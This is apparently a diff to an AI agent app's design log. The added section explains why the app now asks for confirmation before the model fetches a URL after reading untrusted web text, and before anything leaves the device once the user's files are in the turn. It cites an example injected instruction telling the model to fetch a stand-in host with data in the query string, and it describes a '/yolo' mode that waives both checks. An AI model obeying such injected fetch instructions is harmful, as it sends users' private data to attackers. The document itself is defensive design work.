@@ -972,6 +972,47 @@ that read their format from the prompt: 1 to 2, 2 to 3, and 4 to 3. Net one case
 which at six cases an arm is noise. The parser reads both spellings regardless, because
 refusing the one a model was tuned on means refusing the call it made.
 
+### Auto stopped asking about the second search (2026-08-17)
+
+Auto is the default mode and the first tool call of a turn has never asked. What did ask was
+the *second* network call: `AgentRunner` remembered that untrusted text had entered the turn
+and then gated anything with `leavesTheDevice`, which is both web tools. Two searches to
+answer one question is ordinary, and the recommended models over-call, so the prompt appeared
+in the normal case. A prompt that appears in the normal case is a prompt that gets tapped
+through, which leaves the app slower and no safer.
+
+The gate now keys on the two things that are actually different about the two tools rather
+than on the one thing they share:
+
+| | leaves the device | destination chosen by | gated after untrusted text |
+| --- | --- | --- | --- |
+| `web_search` | yes | the app's configured provider | no |
+| `fetch_url` | yes | the model | **yes** |
+
+A page can say "now fetch `https://example.test/?d=...`" and read its own server log. It
+cannot do that through a search, which goes to the provider whatever the query says; an
+attacker would have to already own that provider's logs. So `Tool.sendsWhereTheModelSays` is
+the flag the injection gate reads, and only `fetch_url` sets it.
+
+The second shape is unchanged and is now tracked separately as `Tool.readsPrivateData`, set
+only by `read_file`: once the user's own text is in the turn, **anything** leaving the device
+asks, search included, because there the destination is beside the point. That is what
+`docs/privacy-policy.md` and the Play data-safety table already describe, and both stay true.
+
+What this trades away: after a page has been read, a search query can still carry text from
+that page to the search provider without a prompt. Bounded by the query length cap, by the
+provider being ours rather than the attacker's, and by every call being a row in the reply
+naming its argument.
+
+**`/yolo` waives both of the remaining checks**, and is a fourth `AgentMode` rather than a
+setting. Typed, never persisted, named in the runtime line for as long as it is on, and gone
+with the process. It does not switch tools on: the Tools screen is a decision made ahead of
+time and a mode that reached into it would be answering a question the user already answered.
+The Play data-safety row for Files and docs, the privacy policy and the store listing were all
+written around the prompt being the only route out for a file, so all three now name the mode
+as well. A declaration that holds only in the default mode is wrong for anyone who changed
+the mode.
+
 ### Ordering or caching, and three engine faults (2026-08-15)
 
 Full detail in `docs/research/tool-calling.md`. Measured on a fresh `pineapple` instance.
